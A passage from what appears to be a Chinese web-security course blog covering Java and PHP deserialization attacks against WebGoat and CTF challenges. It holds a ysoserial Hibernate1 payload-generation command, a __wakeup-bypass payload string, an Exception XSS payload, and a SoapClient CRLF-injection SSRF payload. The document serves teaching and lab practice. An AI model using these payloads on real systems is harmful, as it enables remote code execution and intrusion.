src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p> 解码后是一段英文，百度翻译也没发现有啥用处：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-16769497958759.png" alt="img"></p><p>题目还给出了一个接收序列化数据的表单，先分析一波：</p><p>用burpsuite抓包：</p><p> <img src="https://img-blog.csdnimg.cn/022a10fc96ac48dbac308d45bc3b5c9e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p> 可以看到，表单提交的数据通过token接收，并发送到&#x2F;InsecureDeserialization&#x2F;task这个页面，可以通过&#x2F;InsecureDeserialization&#x2F;task找出对应的源码，所以，页面接收的token是一段经过base64编码的序列化数据</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694992761215.png" alt="img"></p><h6 id="利用漏洞：—-ysoserial工具"><a href="#利用漏洞：—-ysoserial工具" class="headerlink" title="利用漏洞：—-ysoserial工具"></a>利用漏洞：—-ysoserial工具</h6><p>找到了传输序列化数据的接口，接下来就需要构造payload了</p><p>首先肯定是查找已知漏洞的利用，对于分析代码去构造payload，没技术不说，也没时间去搞，最简单最直接就是找披露过的java插件漏洞。</p><p>运行ysoserial工具</p><p>java -jar ysoserial.jar</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694999310318.png" alt="img"></p><p>按照ysoserial支持的插件，查找webgoat是否安装了对应的jar包，这里只有两个：</p><p>Hibernate和spring-core 但是spring-core的版本不一致，所以就选择Hibernate</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695000829021.png" alt="img"></p><p>将Hibernate的jar包复制到ysoserial工具的目录下，jar包名字中必须是有core的，是插件的核心</p><p> 我这里是hibernate-core-5.4.6.Final.jar这个包，利用ysoserial生成payload，执行以下命令</p><blockquote><p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin</p></blockquote><p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;  &#x2F;&#x2F;表示hibernate5的插件</p><p>ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin  &#x2F;&#x2F;生成Hibernate1插件反序列化漏洞的payload，执行calc.exe命令，将payload保存在token.bin文件中</p><p>payload生成了，但是表单接收的是经过base64编码的：采用python写的简单脚本对payloadbase64编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">input</span>(<span class="string">&quot;输入需要base64编码的文件名：&quot;</span>)</span><br><span class="line">s = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read() <span class="comment">#文本默认模式读取文件内容rt</span></span><br><span class="line">base64_str = base64.urlsafe_b64encode(s)</span><br><span class="line"><span class="comment">#文本默认模式写入文件内容wt</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;base64.txt&quot;</span>, <span class="string">&quot;wt&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>).write(base64_str.decode())</span><br></pre></td></tr></table></figure><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695018053324.png" alt="img"></p><p>将编码的字符串提交：成功执行calc.exe命令</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695019540927.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</title>
      <link href="/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/"/>
      <url>/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、反序列化魔术方法全解</p><p>2、反序列化变量属性全解</p><p>3、反序列化魔术方法原生类</p><p>4、反序列化语言特性漏洞绕过</p><p>-其他魔术方法 </p><p>-共有&amp;私有&amp;保护 </p><p>-语言模式方法漏洞 </p><p>-原生类获取利用配合</p><h3 id="反序列化利用大概分类三类"><a href="#反序列化利用大概分类三类" class="headerlink" title="#反序列化利用大概分类三类"></a>#反序列化利用大概分类三类</h3><p>-魔术方法的调用逻辑-如触发条件</p><p>-语言原生类的调用逻辑-如SoapClient</p><p>-语言自身的安全缺陷-如CVE-2016-7124</p><h3 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h3><p>-PHP&amp;Java&amp;Python</p><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串</p><p>unserialize()   &#x2F;&#x2F;将字符串还原成一个对象</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h3 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h3><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><p>__construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用</p><p>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用</p><p>__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用</p><p>__invoke(): &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会被自动调用</p><p>__call(): &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p><p>__callStatci(): &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get(): &#x2F;&#x2F;用于从不可访问的属性读取数据</p><p>__set(): &#x2F;&#x2F;用于将数据写入不可访问的属性</p><p>__isset(): &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</p><p>__unset(): &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发</p><p>__sleep(): &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法sleep() 如果存在，该方法会被优先调用</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 方法&amp;属性-调用详解&amp;变量数据详解</p><p>➢ CTF-语言漏洞-__wakeup()方法绕过</p><p>➢ CTF-方法原生类-获取&amp;利用&amp;配合其他</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="CTF-语言漏洞-wakeup-方法绕过"><a href="#CTF-语言漏洞-wakeup-方法绕过" class="headerlink" title="#CTF-语言漏洞-__wakeup()方法绕过"></a>#CTF-语言漏洞-__wakeup()方法绕过</h4><p> [极客大挑战 2019]PHP CVE-2016-7124 </p><p>如果存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，</p><p>但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>1、下载源码分析，触发flag条件</p><p>2、分析会触发调用__wakeup 强制username值</p><p>3、利用语言漏洞绕过 CVE-2016-7124</p><p>4、构造payload后 修改满足漏洞条件触发</p><p>Pyload:</p><p>select&#x3D;O%3A4%3A”Name”%3A3%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D</p><h4 id="CTF-方法原生类-获取-amp-利用-amp-配合其他"><a href="#CTF-方法原生类-获取-amp-利用-amp-配合其他" class="headerlink" title="#CTF-方法原生类-获取&amp;利用&amp;配合其他"></a>#CTF-方法原生类-获取&amp;利用&amp;配合其他</h4><p>参考案例：<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><p>-PHP有那些原生类-见脚本使用</p><p>-常见使用的原生类-见参考案例</p><p>-原生类该怎么使用-见官方说明</p><p>0、生成原生类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">​    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">​    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">​        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">​            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">​        ))) &#123;</span><br><span class="line">​            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>1、本地Demo-xss</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">-输出对象可调用__toString</span><br><span class="line"></span><br><span class="line">-无代码通过原生类<span class="built_in">Exception</span></span><br><span class="line"></span><br><span class="line">-<span class="built_in">Exception</span>使用查询编写利用</span><br><span class="line"></span><br><span class="line">-通过访问触发输出产生XSS漏洞</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xiaodi&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2、CTFSHOW-259</p><p>-不存在的方法触发__call</p><p>-无代码通过原生类SoapClient</p><p>-SoapClient使用查询编写利用</p><p>-通过访问本地Flag.php获取Flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day45 WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</title>
      <link href="/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、什么是反序列化操作？-格式转换</p><p>2、为什么会出现安全漏洞？-魔术方法</p><p>3、反序列化漏洞如何发现？ -对象逻辑</p><p>4、反序列化漏洞如何利用？-POP链构造</p><p>补充：反序列化利用大概分类三类</p><p>-魔术方法的调用逻辑-如触发条件</p><p>-语言原生类的调用逻辑-如SoapClient</p><p>-语言自身的安全缺陷-如CVE-2016-7124</p><h3 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h3><p>-PHP&amp;Java&amp;Python</p><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串</p><p>unserialize()   &#x2F;&#x2F;将字符串还原成一个对象</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h3 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h3><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><p>__construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用</p><p>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用</p><p>__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用</p><p>__invoke(): &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会被自动调用</p><p>__call(): &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p><p>__callStatci(): &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get(): &#x2F;&#x2F;用于从不可访问的属性读取数据</p><p>__set(): &#x2F;&#x2F;用于将数据写入不可访问的属性</p><p>__isset(): &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</p><p>__unset(): &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发</p><p>sleep(): &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法 sleep() 如果存在，该方法会被优先调用</p><p><img src="/../images/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/0.png" alt="img"></p><p><img src="/../images/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/0-16754039660173.png" alt="img"></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 反序列化-魔术方法&amp;漏洞引发&amp;变量修改等</p><p>➢ CTFSHOW-关卡254到260-原生类&amp;POP构造</p><p>➢ CMS代码审计-Typecho反序列化&amp;魔术方法逻辑</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="反序列化-魔术方法-amp-漏洞引发-amp-变量修改等"><a href="#反序列化-魔术方法-amp-漏洞引发-amp-变量修改等" class="headerlink" title="#反序列化-魔术方法&amp;漏洞引发&amp;变量修改等"></a>#反序列化-魔术方法&amp;漏洞引发&amp;变量修改等</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化&amp;反序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demotest</span></span>&#123;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;29&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span>=<span class="keyword">new</span> <span class="title function_ invoke__">demotest</span>()</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$example</span>);<span class="comment">//序列化</span></span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);<span class="comment">//反序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;</span></span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-安全问题"><a href="#x2F-x2F-安全问题" class="headerlink" title="&#x2F;&#x2F;安全问题"></a>&#x2F;&#x2F;安全问题</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;echo test&#x27;</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="keyword">echo</span> <span class="string">&#x27;x&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">echo</span> <span class="string">&#x27;__construct&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">return</span> <span class="string">&#x27;__toString&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无需函数，创建对象触发魔术方法</span></span><br><span class="line"><span class="comment">//$a=new A();//触发__construct</span></span><br><span class="line"><span class="comment">//$a-&gt;test();//触发test</span></span><br><span class="line"><span class="comment">//echo $a;//触发__toString</span></span><br><span class="line"><span class="comment">//触发__destruct</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;echo test&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-漏洞出现"><a href="#x2F-x2F-漏洞出现" class="headerlink" title="&#x2F;&#x2F;漏洞出现"></a>&#x2F;&#x2F;漏洞出现</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-函数引用，无对象创建触发魔术方法"><a href="#x2F-x2F-函数引用，无对象创建触发魔术方法" class="headerlink" title="&#x2F;&#x2F;函数引用，无对象创建触发魔术方法"></a>&#x2F;&#x2F;函数引用，无对象创建触发魔术方法</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?x=O:1:&quot;B&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[x]);</span><br><span class="line"><span class="comment">//$b=new b();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;ipconfig&#x27;</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">###### //函数引用</span></span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-无对象创建触发魔术方法自定义变量"><a href="#x2F-x2F-无对象创建触发魔术方法自定义变量" class="headerlink" title="&#x2F;&#x2F;无对象创建触发魔术方法自定义变量"></a>&#x2F;&#x2F;无对象创建触发魔术方法自定义变量</h6><p>&#x2F;&#x2F;?c&#x3D;O:1:”C”:1:{s:3:”cmd”;s:3:”ver”;}</p><p>unserialize($_GET[c]);</p><p>?&gt;</p><h4 id="CTFSHOW-关卡254到260-原生类-amp-POP构造"><a href="#CTFSHOW-关卡254到260-原生类-amp-POP构造" class="headerlink" title="#CTFSHOW-关卡254到260-原生类&amp;POP构造"></a>#CTFSHOW-关卡254到260-原生类&amp;POP构造</h4><h5 id="254-对象引用执行逻辑"><a href="#254-对象引用执行逻辑" class="headerlink" 